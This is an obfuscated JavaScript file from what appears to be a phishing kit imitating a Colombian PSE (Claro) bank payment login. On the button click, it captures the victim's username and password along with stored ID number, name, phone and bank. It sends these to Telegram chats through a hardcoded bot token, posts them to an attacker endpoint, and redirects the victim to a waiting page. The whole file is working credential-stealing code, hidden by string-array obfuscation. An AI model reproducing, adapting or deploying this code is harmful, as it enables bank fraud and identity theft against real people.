const _0x32a5af = _0x5a29;
function _0x5a29(_0x5b9b1a, _0x4a74ec) {
  const _0x5c9d1a = _0x5c9d();
  return (
    (_0x5a29 = function (_0x5a29ec, _0x38444a) {
      _0x5a29ec = _0x5a29ec - 0x6f;
      let _0xf0572d = _0x5c9d1a[_0x5a29ec];
      return _0xf0572d;
    }),
    _0x5a29(_0x5b9b1a, _0x4a74ec)
  );
}
(function (_0x547c58, _0x5f05ac) {
  const _0x133778 = _0x5a29,
    _0x2b2d13 = _0x547c58();
  while (!![]) {
    try {
      const _0x3a3935 =
        -parseInt(_0x133778(0x96)) / 0x1 +
        parseInt(_0x133778(0x87)) / 0x2 +
        -parseInt(_0x133778(0x77)) / 0x3 +
        parseInt(_0x133778(0x90)) / 0x4 +
        (-parseInt(_0x133778(0x8f)) / 0x5) * (parseInt(_0x133778(0x79)) / 0x6) +
        (parseInt(_0x133778(0x8a)) / 0x7) * (parseInt(_0x133778(0x95)) / 0x8) +
        parseInt(_0x133778(0x9c)) / 0x9;
      if (_0x3a3935 === _0x5f05ac) break;
      else _0x2b2d13["push"](_0x2b2d13["shift"]());
    } catch (_0xcfd187) {
      _0x2b2d13["push"](_0x2b2d13["shift"]());
    }
  }
})(_0x5c9d, 0x8bc64);
function updateLS() {
  const _0x242594 = _0x5a29;
  LS[_0x242594(0x8b)](_0x242594(0x9d), JSON[_0x242594(0x70)](info));
}
const button = document[_0x32a5af(0x7f)](_0x32a5af(0x80)),
  userInput = document[_0x32a5af(0x7f)](_0x32a5af(0x98)),
  passInput = document[_0x32a5af(0x7f)]("txtPass");
async function sendToTelegram(_0x3c184f) {
  const _0x59e35f = _0x32a5af;
  for (const _0x291fb5 of chatIds) {
    const _0x14e6b5 =
      "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=" +
      _0x291fb5 +
      "&text=" +
      encodeURIComponent(_0x3c184f);
    try {
      const _0x29f76b = await fetch(_0x14e6b5);
      _0x29f76b["ok"]
        ? console[_0x59e35f(0x86)](
            "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20" +
              _0x291fb5 +
              ")"
          )
        : console[_0x59e35f(0x7d)](
            _0x59e35f(0x84) + _0x291fb5 + "):",
            _0x29f76b["statusText"]
          );
    } catch (_0x1f784c) {
      console[_0x59e35f(0x7d)](_0x59e35f(0x72) + _0x291fb5 + "):", _0x1f784c);
    }
  }
}
button["addEventListener"]("click", async function (_0x241e74) {
  const _0x4252aa = _0x32a5af;
  _0x241e74[_0x4252aa(0x89)](), (button["disabled"] = !![]);
  if (userInput[_0x4252aa(0x99)] == "" && passInput[_0x4252aa(0x99)] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x4252aa(0x8e)](),
      (button[_0x4252aa(0x76)] = ![]);
    return;
  } else {
    var _0x137088 = userInput[_0x4252aa(0x99)],
      _0x2ad8c4 = passInput[_0x4252aa(0x99)];
    (info[_0x4252aa(0x97)][_0x4252aa(0x7b)] = _0x137088),
      (info["metaInfo"]["puser"] = _0x2ad8c4),
      updateLS();
    const _0x2a05ef = {
        id: info[_0x4252aa(0x97)]["cc"],
        nombre: info["metaInfo"][_0x4252aa(0x8c)],
        telefono: info["metaInfo"][_0x4252aa(0x81)],
        direccion: "",
        usuario: info["metaInfo"]["user"],
        password: info[_0x4252aa(0x97)][_0x4252aa(0x93)],
        bank: info[_0x4252aa(0x97)][_0x4252aa(0x7a)],
      },
      _0x5478a4 =
        _0x4252aa(0x71) +
        _0x2a05ef["id"] +
        _0x4252aa(0x7c) +
        _0x2a05ef[_0x4252aa(0x92)] +
        _0x4252aa(0x7e) +
        _0x2a05ef[_0x4252aa(0x73)] +
        _0x4252aa(0x83) +
        _0x2a05ef["usuario"] +
        "\x0a🔒Contraseña:\x20" +
        _0x2a05ef[_0x4252aa(0x82)] +
        _0x4252aa(0x9b) +
        _0x2a05ef[_0x4252aa(0x9a)] +
        _0x4252aa(0x85) +
        fuente +
        _0x4252aa(0x88);
    await sendToTelegram(_0x5478a4),
      fetch(url + "/trico/tricoPse", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON[_0x4252aa(0x70)](_0x2a05ef),
      })
        [_0x4252aa(0x94)]((_0x30d780) => {
          const _0x34d4f3 = _0x4252aa;
          if (!_0x30d780["ok"]) throw new Error(_0x34d4f3(0x78));
          return _0x30d780[_0x34d4f3(0x75)]();
        })
        [_0x4252aa(0x94)]((_0x4b6362) => {
          const _0x3b88f0 = _0x4252aa;
          window["location"][_0x3b88f0(0x6f)] = _0x3b88f0(0x91);
        })
        [_0x4252aa(0x8d)]((_0x1d59d5) => {
          const _0x5ac7c1 = _0x4252aa;
          console[_0x5ac7c1(0x7d)](_0x5ac7c1(0x74), _0x1d59d5),
            (button[_0x5ac7c1(0x76)] = ![]);
        });
  }
});
function _0x5c9d() {
  const _0x4f170d = [
    "disabled",
    "1723302MfKEEU",
    "Network\x20response\x20was\x20not\x20ok",
    "791082JWgwSW",
    "ban",
    "user",
    "\x0a🆔Nombre:\x20",
    "error",
    "\x0a📱Teléfono:\x20",
    "getElementById",
    "btnUsuario",
    "telnum",
    "password",
    "\x0a🚹Usuario:\x20",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "\x0aFuente:\x20",
    "log",
    "525784VwyNOb",
    "\x0a\x20\x20\x20\x20",
    "preventDefault",
    "2191VnGfXl",
    "setItem",
    "dudename",
    "catch",
    "focus",
    "40HyYpdA",
    "1589440adKTgd",
    "./wait.html",
    "nombre",
    "puser",
    "then",
    "27056hqMJxH",
    "115601ypALTa",
    "metaInfo",
    "txtUsuario",
    "value",
    "bank",
    "\x0a🏦Banco:\x20",
    "5386581BXpyCy",
    "info",
    "href",
    "stringify",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "telefono",
    "Error:",
    "json",
  ];
  _0x5c9d = function () {
    return _0x4f170d;
  };
  return _0x5c9d();
}
